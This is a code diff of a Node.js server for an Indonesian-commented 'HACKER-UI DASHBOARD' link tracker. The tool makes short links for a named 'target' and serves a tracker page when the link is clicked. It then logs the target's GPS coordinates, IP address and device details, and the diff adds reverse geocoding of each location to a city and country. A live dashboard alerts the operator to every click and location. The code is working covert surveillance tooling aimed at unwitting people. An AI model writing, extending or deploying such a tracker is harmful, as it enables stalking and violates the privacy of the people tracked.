@@ -1,4 +1,4 @@
-// File: server.js (FINAL MERGE v3.1 - Notifikasi Klik Real-time)
+// File: server.js (v3.6 - Menampilkan Lokasi di Tabel Utama)
 
 require('dotenv').config();
 
@@ -12,6 +12,7 @@ const path = require('path');
 const cors = require('cors');
 const db = require('./db');
 const requestIp = require('request-ip');
+const axios = require('axios');
 
 const app = express();
 const server = http.createServer(app);
@@ -23,28 +24,33 @@ app.use(cors());
 app.use(express.json());
 app.use(requestIp.mw());
 
-// Arahkan root ke dashboard
 app.get('/', (req, res) => res.redirect('/dashboard.html'));
-
-// Layani file statis (dashboard.html, tracker.html, dll.)
 app.use(express.static(__dirname));
-
 
 // ================== HELPER FUNCTIONS ================== //
 
-// Broadcast data dashboard ke semua klien
 const broadcastDashboardUpdate = async () => {
     try {
-        // Ambil data link
+        // !!! QUERY DIPERBARUI UNTUK MENGAMBIL LOKASI TERAKHIR !!!
         const [links] = await db.promise().query(`
-            SELECT l.id, l.original_url, l.created_at, l.expires_at, 
-                   u.username, l.click_count, l.last_clicked_at 
-            FROM links l 
-            JOIN users u ON l.user_id = u.id 
-            ORDER BY l.created_at DESC
+            SELECT 
+                l.id, l.original_url, l.created_at, l.expires_at, 
+                u.username, l.click_count, l.last_clicked_at,
+                last_loc.city, last_loc.country
+            FROM 
+                links l 
+            JOIN 
+                users u ON l.user_id = u.id
+            LEFT JOIN (
+                SELECT 
+                    tracker_id, city, country,
+                    ROW_NUMBER() OVER (PARTITION BY tracker_id ORDER BY created_at DESC) as rn
+                FROM locations
+            ) AS last_loc ON l.id = last_loc.tracker_id AND last_loc.rn = 1
+            ORDER BY 
+                l.created_at DESC
         `);
 
-        // Ambil data ringkas
         const [stats] = await db.promise().query(`
             SELECT 
                 (SELECT COUNT(*) FROM links) as total_links,
@@ -52,7 +58,6 @@ const broadcastDashboardUpdate = async () => {
                 (SELECT COUNT(*) FROM locations) as total_locations
         `);
 
-        // Ambil data browser
         const [locations] = await db.promise().query(`SELECT user_agent FROM locations`);
         const parser = new UAParser();
         const browserStats = locations.reduce((acc, loc) => {
@@ -63,43 +68,31 @@ const broadcastDashboardUpdate = async () => {
             return acc;
         }, {});
 
-        // Broadcast update
-        io.emit('dashboard_update', { 
-            links, 
-            stats: stats[0],
-            browserStats 
-        });
+        io.emit('dashboard_update', { links, stats: stats[0], browserStats });
     } catch (error) {
         console.error("❌ Gagal broadcast update:", error);
     }
 };
 
-// Broadcast pesan log ke dashboard
 const broadcastLogMessage = (message) => {
     const timestamp = new Date().toLocaleTimeString('id-ID');
     io.emit('new_log_message', `[${timestamp}] ${message}`);
 };
-
 
 // ================== SOCKET.IO ================== //
 
 io.on('connection', (socket) => {
     console.log('🔌 Klien baru terhubung via WebSocket');
     broadcastLogMessage(`> New client connected: ${socket.id.substring(0, 5)}...`);
-
-    // Kirim data dashboard awal
     broadcastDashboardUpdate();
-
     socket.on('disconnect', () => {
         console.log('🔌 Klien terputus');
         broadcastLogMessage(`> Client disconnected: ${socket.id.substring(0, 5)}...`);
     });
 });
 
-
 // ================== API ROUTES ================== //
 
-// Buat link baru
 app.post('/create', async (req, res) => {
     const { username, originalUrl, expiresIn } = req.body;
     if (!username || !originalUrl)
@@ -112,7 +105,6 @@ app.post('/create', async (req, res) => {
     }
 
     try {
-        // Cari / buat user
         let [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
         let userId;
         if (users.length > 0) {
@@ -121,68 +113,40 @@ app.post('/create', async (req, res) => {
             const [result] = await db.promise().query('INSERT INTO users (username) VALUES (?)', [username]);
             userId = result.insertId;
         }
-
-        // Simpan link
         const id = nanoid(8);
-        await db.promise().query('INSERT INTO links SET ?', { 
-            id, 
-            user_id: userId, 
-            original_url: originalUrl, 
-            expires_at: expiresAt 
-        });
-
+        await db.promise().query('INSERT INTO links SET ?', { id, user_id: userId, original_url: originalUrl, expires_at: expiresAt });
         broadcastLogMessage(`> Link created for target [${username}] with ID [${id}]`);
         broadcastDashboardUpdate();
-
         res.status(201).json({ newLink: `http://localhost:${PORT}/${id}`, username });
     } catch (error) {
+        console.error("Error creating link:", error);
         res.status(500).json({ error: 'DB error' });
     }
 });
 
-// Endpoint yang diklik target
 app.get('/:id', async (req, res) => {
     const { id } = req.params;
     try {
-        const [links] = await db.promise().query(`
-            SELECT l.original_url, l.expires_at, u.username 
-            FROM links l 
-            JOIN users u ON l.user_id = u.id 
-            WHERE l.id = ?`, [id]);
-
+        const [links] = await db.promise().query(`SELECT l.original_url, l.expires_at, u.username FROM links l JOIN users u ON l.user_id = u.id WHERE l.id = ?`, [id]);
         if (links.length === 0) return res.status(404).send('<h1>404 Not Found</h1>');
-
-        const { original_url, expires_at, username } = links[0];
-        if (expires_at && new Date(expires_at) < new Date())
-            return res.status(410).send('<h1>Link has expired.</h1>');
-
-        // Update click
-        await db.promise().query(
-            "UPDATE links SET click_count = click_count + 1, last_clicked_at = NOW() WHERE id = ?", 
-            [id]
-        );
-
-        broadcastLogMessage(`> Link [${id}] clicked by target [${username}]`);
         
-        // !!! PENAMBAHAN BARU: Kirim notifikasi khusus ke dashboard !!!
+        const { original_url, expires_at, username } = links[0];
+        if (expires_at && new Date(expires_at) < new Date()) return res.status(410).send('<h1>Link has expired.</h1>');
+        
+        await db.promise().query("UPDATE links SET click_count = click_count + 1, last_clicked_at = NOW() WHERE id = ?", [id]);
+        broadcastLogMessage(`> Link [${id}] clicked by target [${username}]`);
         io.emit('link_clicked', { username: username, id: id });
 
-        // Kirim tracker.html
         fs.readFile(path.join(__dirname, 'tracker.html'), 'utf8', (fsErr, data) => {
             if (fsErr) return res.status(500).send('Server error');
-            res.send(
-                data
-                    .replace('{{DESTINATION_URL}}', original_url)
-                    .replace('{{TRACKER_ID}}', id)
-                    .replace('{{USERNAME}}', username)
-            );
+            res.send(data.replace('{{DESTINATION_URL}}', original_url).replace('{{TRACKER_ID}}', id).replace('{{USERNAME}}', username));
         });
     } catch (error) {
+        console.error("Error handling link click:", error);
         res.status(500).send('Server error');
     }
 });
 
-// Terima log lokasi + perangkat
 app.post('/log', async (req, res) => {
     const { latitude, longitude, trackerId, username } = req.body;
     const userAgentString = req.headers['user-agent'];
@@ -190,40 +154,46 @@ app.post('/log', async (req, res) => {
 
     try {
         const [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
-        if (users.length === 0) return res.status(404).json({ status: 'error' });
+        if (users.length === 0) return res.status(404).json({ status: 'error', message: 'User not found' });
 
-        const newLocation = { 
-            user_id: users[0].id, 
-            tracker_id: trackerId, 
-            latitude, 
-            longitude, 
-            ip_address: ipAddress, 
-            user_agent: userAgentString 
-        };
+        let country = null, city = null, region = null;
+        try {
+            const apiKey = process.env.OPENCAGE_API_KEY;
+            if (!apiKey) {
+                console.warn("⚠️  OPENCAGE_API_KEY not found in .env. Skipping geocoding.");
+            } else {
+                const url = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${apiKey}&language=id&pretty=1`;
+                const response = await axios.get(url);
+                const components = response.data.results[0]?.components;
+                if (components) {
+                    country = components.country;
+                    city = components.city || components.town || components.village || components.state_district;
+                    region = components.state;
+                }
+            }
+        } catch (geoError) {
+            console.error("❌ Geocoding error:", geoError.message);
+        }
 
+        const newLocation = { user_id: users[0].id, tracker_id: trackerId, latitude, longitude, ip_address: ipAddress, user_agent: userAgentString, country, city };
         await db.promise().query('INSERT INTO locations SET ?', newLocation);
 
-        // Analisis User-Agent untuk log detail
-        const parser = new UAParser();
-        const ua = parser.setUA(userAgentString).getResult();
+        const parser = new UAParser(userAgentString);
+        const ua = parser.getResult();
         const browserInfo = ua.browser.name ? `${ua.browser.name} ${ua.browser.version || ''}`.trim() : 'Unknown';
         const osInfo = ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown';
-        const deviceInfo = ua.device.type 
-            ? `${ua.device.vendor || 'Unknown'} ${ua.device.model || ''} (${ua.device.type})`
-            : 'Desktop';
-
-        // Log detail ke dashboard
-        broadcastLogMessage(`> Location from [${username}] | ${browserInfo} on ${osInfo} | Device: ${deviceInfo} | IP: ${ipAddress}`);
-
-        console.log(`📍 Lokasi diterima dari: ${username} [${ipAddress}]`);
+        const locationInfo = city ? `from ${city}, ${country}` : '';
+        
+        broadcastLogMessage(`> Location ${locationInfo} from [${username}] | ${browserInfo} on ${osInfo} | IP: ${ipAddress}`);
+        console.log(`📍 Lokasi diterima dari: ${username} [${ipAddress}] - ${city || 'Unknown City'}, ${country || 'Unknown Country'}`);
         broadcastDashboardUpdate();
         res.json({ status: 'success' });
     } catch (error) {
+        console.error("Error logging location:", error);
         res.status(500).json({ status: 'error' });
     }
 });
 
-// Hapus link
 app.delete('/api/links/:id', async (req, res) => {
     const { id } = req.params;
     try {
@@ -236,46 +206,37 @@ app.delete('/api/links/:id', async (req, res) => {
     }
 });
 
-// Ambil detail lokasi dari 1 link
+app.get('/api/locations', async (req, res) => {
+    try {
+        const [rows] = await db.promise().query(`
+            SELECT l.latitude, l.longitude, l.created_at, l.ip_address, l.user_agent, l.tracker_id, l.country, l.city, u.username
+            FROM locations l JOIN users u ON l.user_id = u.id ORDER BY l.created_at DESC`);
+        res.json(rows);
+    } catch (err) {
+        res.status(500).json({ error: 'Database error' });
+    }
+});
+
 app.get('/api/locations/:trackerId', async (req, res) => {
     const { trackerId } = req.params;
     try {
         const [locations] = await db.promise().query(`
-            SELECT latitude, longitude, created_at, ip_address, user_agent 
-            FROM locations 
-            WHERE tracker_id = ? 
-            ORDER BY created_at DESC
-        `, [trackerId]);
-
+            SELECT latitude, longitude, created_at, ip_address, user_agent, country, city
+            FROM locations WHERE tracker_id = ? ORDER BY created_at DESC`, [trackerId]);
         const parser = new UAParser();
         const parsedLocations = locations.map(loc => {
             const ua = parser.setUA(loc.user_agent).getResult();
-            return {
-                latitude: loc.latitude,
-                longitude: loc.longitude,
-                created_at: loc.created_at,
-                ip_address: loc.ip_address,
-                browser: ua.browser.name ? `${ua.browser.name} ${ua.browser.version || ''}`.trim() : 'Unknown',
-                os: ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown',
-                device: {
-                    type: ua.device.type || 'desktop',
-                    vendor: ua.device.vendor || 'Unknown',
-                    model: ua.device.model || 'N/A'
-                }
-            };
+            return { ...loc, browser: ua.browser.name ? `${ua.browser.name} ${ua.browser.version || ''}`.trim() : 'Unknown', os: ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown', device: { type: ua.device.type || 'desktop', vendor: ua.device.vendor || 'Unknown', model: ua.device.model || 'N/A' } };
         });
-
         res.json(parsedLocations);
     } catch (error) {
         res.status(500).json({ error: 'DB error' });
     }
 });
 
-
 // ================== RUN SERVER ================== //
-
 server.listen(PORT, () => {
-    console.log(`\n HACKER-UI DASHBOARD v3.1 (Full Features + Detailed Live Log + Device Info + Click Notification)`);
-    console.log(`=============================================================================================`);
+    console.log(`\n HACKER-UI DASHBOARD v3.6 (Dashboard Location View)`);
+    console.log(`===================================================`);
     console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
 });
